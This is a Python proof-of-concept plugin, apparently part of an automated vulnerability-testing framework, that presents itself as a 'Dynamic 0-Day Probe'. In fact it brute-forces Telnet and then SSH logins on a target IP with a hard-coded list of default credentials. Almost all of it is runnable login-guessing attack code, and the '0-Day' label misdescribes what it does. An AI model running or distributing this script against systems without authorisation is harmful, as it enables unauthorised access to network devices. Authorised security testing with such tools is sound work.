"""
PoC Name: Dynamic 0-Day Probe
CVE: N/A
Component: Network Stack
Category: Network
Severity: High
Description: Weaponize Agent 自动生成的动态探测脚本
Prerequisites: 目标可达
"""
import sys
import socket
import time
from iv_plugin_base import IVIVulnerabilityPlugin


class Dynamic0DayPlugin(IVIVulnerabilityPlugin):
    meta_poc_name = "Dynamic 0-Day Probe"
    meta_cve_id = "N/A"
    meta_severity = "High"
    meta_protocol = "tcp"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        if not self.target_ip:
            raise RuntimeError("需要指定目标IP地址。")
        return True

    def exploit(self):
        self.results["description"] = "Weaponize Agent 自动生成的动态0-Day探测"
        target_ip = self.target_ip
        target_port = self.target_port
        try:
            import socket
            import paramiko
            import time

            # 目标 IP 地址
            # Note: target_ip is already defined above from self.target_ip
            telnet_port = 23
            ssh_port = 22

            # 弱口令字典
            weak_creds = [
                ("root", "root"),
                ("admin", "admin"),
                ("root", "123456"),
                ("admin", "123456"),
            ]

            def telnet_login(ip, port, username, password):
                try:
                    # 创建 Telnet 连接
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(5)
                        s.connect((ip, port))
                        time.sleep(2)  # 等待 Telnet 服务响应
                        data = s.recv(1024).decode('utf-8')

                        if "login" in data:
                            s.send(f"{username}\n".encode('utf-8'))
                            time.sleep(2)
                            data = s.recv(1024).decode('utf-8')

                            if "Password" in data:
                                s.send(f"{password}\n".encode('utf-8'))
                                time.sleep(2)
                                data = s.recv(1024).decode('utf-8')

                                if "#" in data or "$" in data:
                                    print(f"Telnet 登录成功: {username}:{password}")
                                    return True
                                else:
                                    print(f"Telnet 登录失败: {username}:{password}")
                                    return False
                            else:
                                print(f"Telnet 登录失败: {username}:{password}")
                                return False
                        else:
                            print("Telnet 服务未响应")
                            return False
                except Exception as e:
                    print(f"Telnet 登录异常: {e}")
                    return False

            def ssh_login(ip, port, username, password):
                try:
                    # 创建 SSH 客户端
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, port=port, username=username, password=password, timeout=5)

                    print(f"SSH 登录成功: {username}:{password}")
                    return True
                except (paramiko.AuthenticationException, paramiko.SSHException, socket.error) as e:
                    print(f"SSH 登录失败: {username}:{password} - {e}")
                    return False
                finally:
                    client.close()

            # 尝试 Telnet 登录
            vulnerable = False
            for username, password in weak_creds:
                if telnet_login(target_ip, telnet_port, username, password):
                    vulnerable = True
                    break

            if not vulnerable:
                # 如果 Telnet 登录失败，尝试 SSH 登录
                for username, password in weak_creds:
                    if ssh_login(target_ip, ssh_port, username, password):
                        vulnerable = True
                        break

            self.results["vulnerable"] = vulnerable
            if vulnerable:
                self.results["evidence"] = "Weak credentials detected via Telnet/SSH"
        except Exception as e:
            self.logger.error(f"动态探测脚本执行异常: {e}")
            self.results["evidence"] = f"Exception: {e}"
        return self.results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 99_Dynamic_0Day.py <target_ip>")
        sys.exit(1)
    plugin = Dynamic0DayPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
